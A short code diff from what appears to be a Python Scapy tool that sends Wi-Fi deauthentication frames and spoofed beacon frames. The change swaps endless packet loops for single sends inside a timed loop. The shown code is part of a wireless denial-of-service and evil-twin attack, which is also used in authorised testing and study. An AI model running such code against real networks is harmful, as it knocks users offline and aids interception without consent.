@@ -30,7 +30,7 @@ def deauth_with_beacon(iface: str, SSID: str, deauth_BSSID: str, deauth_client: 
         Dot11Elt(ID='SSID', info=SSID, len=len(SSID))
 
     for i in range(timeout * 10):
-        sendp(deauth_packet, iface=iface, loop=1, inter=0.1)
+        sendp(deauth_packet, iface=iface, count=1)
         print(f'SENDING DEAUTH to {deauth_BSSID}')
-        sendp(beacon_packet, iface=iface, loop=1, inter=0.1)
+        sendp(beacon_packet, iface=iface, count=1)
         print(f'SENDING BEACON for {beacon_BSSID}')
